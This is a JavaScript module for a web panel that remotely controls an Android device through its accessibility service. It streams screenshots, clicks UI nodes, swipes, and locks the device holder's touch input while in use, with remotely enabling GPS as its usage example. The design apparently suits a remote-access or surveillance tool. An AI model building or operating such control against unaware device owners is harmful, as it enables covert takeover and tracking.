/**
 * SmartUI — Remote Accessibility Node Interaction (Screenshot Overlay Version)
 * 
 * Auto-closes after 20s. Touch lock is managed automatically:
 * - On open: touch_lock is sent
 * - On close (auto or manual): touch_unlock is sent
 * 
 * Usage: SmartUI.show(deviceId, { onDone: () => {...}, title: 'Enable GPS' })
 */
const SmartUI = (() => {
    let overlay = null;
    let currentDeviceId = null;
    let opts = {};
    let allNodes = [];
    let screenW = 1080, screenH = 2400;
    let lastUiHash = null;
    let ssBlobUrl = null;
    let autoRefreshTimer = null;
    let autoRefreshInterval = null;
    let autoCloseTimer = null;
    let liveWs = null;

    const AUTO_CLOSE_MS = 20000;

    function escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    function parseBounds(boundsStr) {
        if (!boundsStr) return null;
        const parts = boundsStr.split(',').map(Number);
        if (parts.length !== 4 || parts.some(isNaN)) return null;
        return { left: parts[0], top: parts[1], right: parts[2], bottom: parts[3] };
    }

    function resetAutoClose() {
        if (autoCloseTimer) clearTimeout(autoCloseTimer);
        autoCloseTimer = setTimeout(() => SmartUI.close(), AUTO_CLOSE_MS);
        updateCountdown();
    }

    function updateCountdown() {
        const bar = document.getElementById('sui-timer-bar');
        if (!bar) return;
        bar.style.animation = 'none';
        bar.offsetHeight;
        bar.style.animation = `suiTimerShrink ${AUTO_CLOSE_MS}ms linear forwards`;
    }

    /** Render Lucide icons inside overlay if library is available */
    function renderIcons() {
        if (typeof lucide !== 'undefined' && lucide.createIcons) {
            try { lucide.createIcons({ nameAttr: 'data-lucide' }); } catch (e) { }
        }
    }

    function createOverlay() {
        if (overlay) overlay.remove();

        overlay = document.createElement('div');
        overlay.id = 'smart-ui-overlay';
        overlay.innerHTML = `
            <style>
                #smart-ui-overlay {
                    position: fixed;
                    top: 0; left: 0; right: 0; bottom: 0;
                    background: rgba(2, 4, 8, 0.88);
                    backdrop-filter: blur(20px);
                    -webkit-backdrop-filter: blur(20px);
                    z-index: 99999;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-family: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                    animation: suiFadeIn 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                }
                @keyframes suiFadeIn {
                    from { opacity: 0; transform: scale(0.96); }
                    to { opacity: 1; transform: scale(1); }
                }
                #smart-ui-overlay * { box-sizing: border-box; }

                /* ═══ POPUP CONTAINER ═══ */
                .sui-popup {
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    max-height: 92vh;
                    max-width: 95vw;
                    width: 340px;
                    filter: drop-shadow(0 0 60px rgba(0, 255, 65, 0.04));
                }

                @media (max-height: 700px) {
                    .sui-popup { max-height: 96vh; }
                    .sui-popup-header { padding: 6px 10px; gap: 8px; }
                    .sui-popup-hdr-icon { width: 24px; height: 24px; }
                    .sui-popup-title { font-size: 0.62rem; }
                    .sui-popup-close { width: 24px; height: 24px; }
                    .sui-popup-footer { padding: 5px 10px; gap: 3px; }
                    .sui-fbtn { padding: 3px 7px; font-size: 0.48rem; }
                }
                @media (max-width: 380px) {
                    .sui-popup { width: 96vw; }
                }

                /* ═══ HEADER ═══ */
                .sui-popup-header {
                    display: flex;
                    align-items: center;
                    gap: 10px;
                    padding: 10px 14px;
                    width: 100%;
                    background: rgba(10, 14, 23, 0.96);
                    border: 1px solid rgba(0, 255, 65, 0.12);
                    border-bottom: none;
                    border-radius: 10px 10px 0 0;
                }
                .sui-popup-hdr-icon {
                    width: 28px; height: 28px;
                    display: flex; align-items: center; justify-content: center;
                    background: linear-gradient(135deg, rgba(0, 255, 65, 0.12), rgba(0, 255, 65, 0.03));
                    border: 1px solid rgba(0, 255, 65, 0.2);
                    border-radius: 7px;
                    color: #00ff41;
                    flex-shrink: 0;
                }
                .sui-popup-title {
                    color: #e0e0e0;
                    font-size: 0.72rem;
                    font-weight: 700;
                    flex: 1;
                    white-space: nowrap;
                    overflow: hidden;
                    text-overflow: ellipsis;
                    min-width: 0;
                }
                .sui-popup-title span {
                    color: #00ff41;
                    text-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
                }
                .sui-popup-status {
                    color: rgba(0, 255, 65, 0.5);
                    font-size: 0.5rem;
                    font-weight: 600;
                    letter-spacing: 1px;
                    text-transform: uppercase;
                    flex-shrink: 0;
                }
                .sui-popup-close {
                    width: 28px; height: 28px;
                    display: flex; align-items: center; justify-content: center;
                    background: rgba(255, 255, 255, 0.03);
                    border: 1px solid rgba(255, 255, 255, 0.06);
                    color: rgba(255, 255, 255, 0.3);
                    border-radius: 7px;
                    cursor: pointer;
                    transition: all 0.15s;
                    flex-shrink: 0;
                    padding: 0;
                }
                .sui-popup-close:hover {
                    background: rgba(255, 51, 51, 0.1);
                    color: #ff5252;
                    border-color: rgba(255, 51, 51, 0.25);
                }

                /* ═══ TIMER ═══ */
                .sui-timer-wrap {
                    width: 100%; height: 2px;
                    background: rgba(0, 255, 65, 0.04);
                    flex-shrink: 0;
                }
                .sui-timer-bar {
                    height: 100%; width: 100%;
                    background: linear-gradient(90deg, #00ff41, #00e5ff);
                    box-shadow: 0 0 8px rgba(0, 255, 65, 0.3);
                    transform-origin: left;
                }
                @keyframes suiTimerShrink {
                    from { transform: scaleX(1); }
                    to { transform: scaleX(0); }
                }

                /* ═══ PHONE FRAME ═══ */
                .sui-phone-wrap {
                    width: 100%;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    background: rgba(5, 8, 14, 0.9);
                    border-left: 1px solid rgba(0, 255, 65, 0.12);
                    border-right: 1px solid rgba(0, 255, 65, 0.12);
                }
                .sui-phone-frame {
                    position: relative;
                    overflow: hidden;
                    background: #000;
                    box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
                }
                .sui-phone-screen {
                    position: relative;
                    width: 100%; height: 100%;
                    overflow: hidden;
                }
                .sui-phone-screen img {
                    display: block;
                    width: 100%; height: 100%;
                }
                .sui-placeholder {
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    flex-direction: column;
                    color: rgba(0, 255, 65, 0.2);
                    font-size: 0.65rem;
                    font-weight: 500;
                    padding: 40px;
                    text-align: center;
                    width: 260px; height: 520px;
                    letter-spacing: 0.5px;
                    gap: 12px;
                }
                .sui-placeholder .p-icon {
                    opacity: 0.15;
                    color: #00ff41;
                    animation: suiPulse 2.5s ease-in-out infinite;
                }
                @keyframes suiPulse {
                    0%, 100% { opacity: 0.15; transform: scale(1); }
                    50% { opacity: 0.3; transform: scale(1.05); }
                }

                /* ═══ SHIMMER ═══ */
                .sui-phone-frame.loading::after {
                    content: '';
                    position: absolute;
                    top: 0; left: 0; right: 0; bottom: 0;
                    background: linear-gradient(90deg, transparent 30%, rgba(0, 255, 65, 0.03) 50%, transparent 70%);
                    animation: suiShimmer 1.5s infinite;
                    pointer-events: none;
                    z-index: 10;
                }
                @keyframes suiShimmer {
                    from { transform: translateX(-100%); }
                    to { transform: translateX(100%); }
                }

                /* ═══ NODE OVERLAY ═══ */
                .sui-node-overlay {
                    position: absolute;
                    top: 0; left: 0;
                    width: 100%; height: 100%;
                    pointer-events: none;
                }
                .sui-node-rect {
                    position: absolute;
                    border: 1px solid transparent;
                    cursor: pointer;
                    pointer-events: auto;
                    transition: all 0.12s ease;
                    z-index: 2;
                }
                .sui-node-rect:hover {
                    border-color: #00ff41;
                    background: rgba(0, 255, 65, 0.1);
                    box-shadow: 0 0 12px rgba(0, 255, 65, 0.2);
                }
                .sui-node-rect.clicking {
                    background: rgba(0, 255, 65, 0.25);
                    border-color: #00ff41;
                    box-shadow: 0 0 16px rgba(0, 255, 65, 0.35);
                }
                .sui-node-tip {
                    display: none;
                    position: absolute;
                    bottom: calc(100% + 4px);
                    left: 50%;
                    transform: translateX(-50%);
                    background: rgba(10, 14, 23, 0.95);
                    border: 1px solid rgba(0, 255, 65, 0.15);
                    border-radius: 5px;
                    padding: 3px 8px;
                    font-size: 0.5rem;
                    font-weight: 500;
                    color: #00ff41;
                    white-space: nowrap;
                    z-index: 100;
                    pointer-events: none;
                    letter-spacing: 0.3px;
                    backdrop-filter: blur(8px);
                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
                }
                .sui-node-rect:hover .sui-node-tip { display: block; }

                /* ═══ LOCK OVERLAY ═══ */
                .sui-lock-overlay {
                    position: absolute;
                    top: 0; left: 0; right: 0; bottom: 0;
                    background: rgba(255, 0, 0, 0.08);
                    border: 1px solid rgba(255, 0, 0, 0.3);
                    pointer-events: none;
                    z-index: 15;
                    display: none;
                    align-items: flex-start;
                    justify-content: center;
                }
                .sui-lock-overlay.active { display: flex; }
                .sui-lock-badge {
                    margin-top: 10px;
                    padding: 4px 12px;
                    background: rgba(255, 0, 0, 0.5);
                    color: #fff;
                    font-size: 0.5rem;
                    font-weight: 600;
                    letter-spacing: 2px;
                    border-radius: 4px;
                    text-transform: uppercase;
                    display: inline-flex;
                    align-items: center;
                    gap: 5px;
                    backdrop-filter: blur(6px);
                }

                /* ═══ FOOTER ═══ */
                .sui-popup-footer {
                    display: flex;
                    flex-direction: column;
                    gap: 4px;
                    padding: 8px 14px;
                    width: 100%;
                    background: rgba(10, 14, 23, 0.96);
                    border: 1px solid rgba(0, 255, 65, 0.12);
                    border-top: none;
                    border-radius: 0 0 10px 10px;
                }
                .sui-footer-row {
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 4px;
                    width: 100%;
                }
                .sui-fbtn {
                    display: inline-flex;
                    align-items: center;
                    justify-content: center;
                    gap: 4px;
                    padding: 5px 10px;
                    border-radius: 6px;
                    font-size: 0.52rem;
                    font-weight: 600;
                    cursor: pointer;
                    border: 1px solid rgba(0, 255, 65, 0.06);
                    background: rgba(0, 255, 65, 0.02);
                    color: rgba(0, 255, 65, 0.4);
                    font-family: 'Satoshi', -apple-system, BlinkMacSystemFont, sans-serif;
                    transition: all 0.15s;
                    letter-spacing: 0.3px;
                    white-space: nowrap;
                }
                .sui-fbtn:hover {
                    color: #00ff41;
                    border-color: rgba(0, 255, 65, 0.2);
                    background: rgba(0, 255, 65, 0.06);
                    box-shadow: 0 0 8px rgba(0, 255, 65, 0.06);
                }
                .sui-fbtn:active { transform: scale(0.95); }
                .sui-fbtn-primary {
                    background: rgba(0, 255, 65, 0.06);
                    border-color: rgba(0, 255, 65, 0.15);
                    color: rgba(0, 255, 65, 0.7);
                }
                .sui-fbtn-primary:hover {
                    background: rgba(0, 255, 65, 0.12);
                    color: #00ff41;
                    box-shadow: 0 0 10px rgba(0, 255, 65, 0.1);
                }
                .sui-popup-info {
                    color: rgba(0, 255, 65, 0.25);
                    font-size: 0.48rem;
                    font-weight: 500;
                    letter-spacing: 0.5px;
                    margin-left: auto;
                    flex-shrink: 0;
                }
            </style>
            <div class="sui-popup">
                <div class="sui-popup-header">
                    <div class="sui-popup-hdr-icon"><i data-lucide="mouse-pointer-click" style="width:14px;height:14px;"></i></div>
                    <div class="sui-popup-title"><span>Smart UI</span></div>
                    <button class="sui-popup-close" onclick="SmartUI.close()"><i data-lucide="x" style="width:14px;height:14px;"></i></button>
                </div>
                <div class="sui-timer-wrap"><div class="sui-timer-bar" id="sui-timer-bar"></div></div>
                <div class="sui-phone-wrap">
                    <div class="sui-phone-frame loading" id="sui-frame">
                        <div class="sui-phone-screen" id="sui-screen">
                            <div class="sui-placeholder" id="sui-placeholder">
                                <span class="p-icon"><i data-lucide="smartphone" style="width:32px;height:32px;"></i></span>
                                <p>CAPTURING SCREEN...</p>
                            </div>
                            <img id="sui-img" style="display:none;" draggable="false" />
                            <div class="sui-node-overlay" id="sui-overlay"></div>
                            <div class="sui-lock-overlay active" id="sui-lock-overlay">
                                <span class="sui-lock-badge"><i data-lucide="lock" style="width:10px;height:10px;"></i> LOCKED</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="sui-popup-footer">
                    <div class="sui-footer-row">
                        <button class="sui-fbtn sui-fbtn-primary" onclick="SmartUI.refresh()"><i data-lucide="refresh-cw" style="width:12px;height:12px;"></i> Refresh</button>
                        <button class="sui-fbtn" onclick="SmartUI.navKey('BACK')"><i data-lucide="arrow-left" style="width:12px;height:12px;"></i> Back</button>
                        <button class="sui-fbtn" onclick="SmartUI.navKey('HOME')"><i data-lucide="circle" style="width:12px;height:12px;"></i> Home</button>
                        <button class="sui-fbtn" onclick="SmartUI.navKey('RECENTS')"><i data-lucide="square" style="width:12px;height:12px;"></i></button>
                    </div>
                    <div class="sui-footer-row">
                        <button class="sui-fbtn" onclick="SmartUI.swipe('left')"><i data-lucide="chevron-left" style="width:12px;height:12px;"></i></button>
                        <button class="sui-fbtn" onclick="SmartUI.swipe('up')"><i data-lucide="chevron-up" style="width:12px;height:12px;"></i></button>
                        <button class="sui-fbtn" onclick="SmartUI.swipe('down')"><i data-lucide="chevron-down" style="width:12px;height:12px;"></i></button>
                        <button class="sui-fbtn" onclick="SmartUI.swipe('right')"><i data-lucide="chevron-right" style="width:12px;height:12px;"></i></button>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(overlay);
        renderIcons();

        // Close on backdrop click
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) SmartUI.close();
        });

        // Escape key
        overlay._escHandler = (e) => {
            if (e.key === 'Escape') SmartUI.close();
        };
        document.addEventListener('keydown', overlay._escHandler);
    }

    // Render node overlays on screenshot
    function renderOverlays() {
        const ovl = document.getElementById('sui-overlay');
        const img = document.getElementById('sui-img');
        if (!ovl || !img || img.style.display === 'none') {
            if (ovl) ovl.innerHTML = '';
            return;
        }

        const natW = img.naturalWidth || screenW;
        const natH = img.naturalHeight || screenH;
        if (natW === 0 || natH === 0) return;

        const interactive = allNodes.filter(n =>
            (n.click || n.check || n.id || n.d) && n.enabled && n.bounds
        );

        ovl.innerHTML = interactive.map(n => {
            const b = parseBounds(n.bounds);
            if (!b) return '';
            const leftPct = (b.left / natW) * 100;
            const topPct = (b.top / natH) * 100;
            const widthPct = ((b.right - b.left) / natW) * 100;
            const heightPct = ((b.bottom - b.top) / natH) * 100;
            if (widthPct < 0.5 || heightPct < 0.3) return '';

            const label = escHtml(n.t || n.d || n.cls || '');
            return `<div class="sui-node-rect"
                style="left:${leftPct}%; top:${topPct}%; width:${widthPct}%; height:${heightPct}%;"
                onclick="SmartUI.clickNode(${n.i}, this)">
                <span class="sui-node-tip">${label || n.cls}</span>
            </div>`;
        }).join('');
    }

    // Size phone frame from actual image
    function sizeFrame(imgW, imgH) {
        const frame = document.getElementById('sui-frame');
        if (!frame) return;
        const maxH = window.innerHeight - 140;
        const aspect = imgW / imgH;
        const maxW = Math.min(window.innerWidth * 0.92, 320);
        const frameW = Math.min(maxH * aspect, maxW);
        const frameH = frameW / aspect;
        frame.style.width = frameW + 'px';
        frame.style.height = frameH + 'px';
    }

    // Fetch tree + screenshot
    async function fetchTree() {
        const frame = document.getElementById('sui-frame');
        if (frame) frame.classList.add('loading');

        try {
            const payload = {};
            if (lastUiHash) payload.lastHash = lastUiHash;
            
            const result = await api.sendCommand(currentDeviceId, 'get_ui_tree', payload);
            const data = result.data || result;
            
            if (data.unchanged) {
                console.log('UI Unchanged (Differential Sync)');
                await captureScreenshot();
                return;
            }
            
            lastUiHash = data.hash;
            const nodes = data.nodes || [];

            if (data.screenWidth) screenW = data.screenWidth;
            if (data.screenHeight) screenH = data.screenHeight;

            allNodes = nodes;


            await captureScreenshot();
        } catch (err) {

            if (frame) frame.classList.remove('loading');
        }
    }

    // Capture screenshot and show
    async function captureScreenshot() {
        const frame = document.getElementById('sui-frame');

        try {
            const result = await api.sendCommand(currentDeviceId, 'accessibility_screenshot', {});
            const data = result.data || result;

            if (data.image) {
                showImage(data.image);

                const img = document.getElementById('sui-img');
                if (img) {
                    img.onload = () => {
                        sizeFrame(img.naturalWidth, img.naturalHeight);
                        renderOverlays();
                    };
                }
            } else {
                throw new Error(result.error || 'No image');
            }
        } catch (err) {
            // screenshot failed silently
        } finally {
            if (frame) frame.classList.remove('loading');
        }
    }

    // Show image from base64
    function showImage(base64Data) {
        if (ssBlobUrl) URL.revokeObjectURL(ssBlobUrl);
        const binary = atob(base64Data);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
        const blob = new Blob([bytes], { type: 'image/jpeg' });
        ssBlobUrl = URL.createObjectURL(blob);

        const img = document.getElementById('sui-img');
        const placeholder = document.getElementById('sui-placeholder');
        if (img) { img.src = ssBlobUrl; img.style.display = 'block'; }
        if (placeholder) placeholder.style.display = 'none';
    }

    // Connect WebSocket for live updates
    function connectLiveWs() {
        try {
            const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
            liveWs = new WebSocket(`${proto}//${location.host}/`);
            liveWs.onopen = () => {
                liveWs.send(JSON.stringify({ type: 'identify', role: 'browser' }));
            };
            liveWs.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    if (data.type === 'ui_changed' && data.deviceId === currentDeviceId) {
                        if (autoRefreshTimer) clearTimeout(autoRefreshTimer);
                        autoRefreshTimer = setTimeout(() => fetchTree(), 300);
                    }
                } catch (err) { }
            };
            liveWs.onclose = () => {
                if (overlay) setTimeout(connectLiveWs, 3000);
            };
            liveWs.onerror = () => { try { liveWs.close(); } catch (e) { } };
        } catch (e) { }
    }

    return {
        show(deviceId, options = {}) {
            currentDeviceId = deviceId;
            opts = options;
            allNodes = [];
            createOverlay();
            fetchTree();
            connectLiveWs();

            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
            autoRefreshInterval = setInterval(() => fetchTree(), 3000);

            resetAutoClose();
        },

        close() {
            if (currentDeviceId) {
                api.sendCommand(currentDeviceId, 'touch_unlock').catch(() => { });
            }

            if (overlay) {
                document.removeEventListener('keydown', overlay._escHandler);
                overlay.remove();
                overlay = null;
            }
            allNodes = [];
            if (ssBlobUrl) { URL.revokeObjectURL(ssBlobUrl); ssBlobUrl = null; }
            if (autoRefreshTimer) { clearTimeout(autoRefreshTimer); autoRefreshTimer = null; }
            if (autoRefreshInterval) { clearInterval(autoRefreshInterval); autoRefreshInterval = null; }
            if (autoCloseTimer) { clearTimeout(autoCloseTimer); autoCloseTimer = null; }
            if (liveWs) { try { liveWs.close(); } catch (e) { } liveWs = null; }
            if (opts.onClose) opts.onClose();
        },

        refresh() {
            fetchTree();
        },

        async navKey(key) {
            try {
                await api.sendCommand(currentDeviceId, 'accessibility_key', { key });
                setTimeout(() => fetchTree(), 800);
            } catch (e) {
                console.error('SmartUI navKey error:', e);
            }
        },

        async swipe(direction) {
            try {
                await api.sendCommand(currentDeviceId, 'accessibility_swipe', { direction });
                setTimeout(() => fetchTree(), 800);
            } catch (e) {
                console.error('SmartUI swipe error:', e);
            }
        },

        async clickNode(index, el) {
            if (el) el.classList.add('clicking');

            try {
                const result = await api.sendCommand(currentDeviceId, 'click_node', { index });
                const data = result.data || result;

                if (data.clicked) {
                    if (typeof api !== 'undefined') api.showToast('Clicked', 'success');
                    setTimeout(() => fetchTree(), 1000);
                    if (opts.onDone) setTimeout(() => opts.onDone(), 1200);
                } else {
                    if (el) el.classList.remove('clicking');
                    if (typeof api !== 'undefined') api.showToast('Click failed', 'error');
                }
            } catch (err) {
                if (el) el.classList.remove('clicking');
                console.error('SmartUI click error:', err);
            }
        },
    };
})();
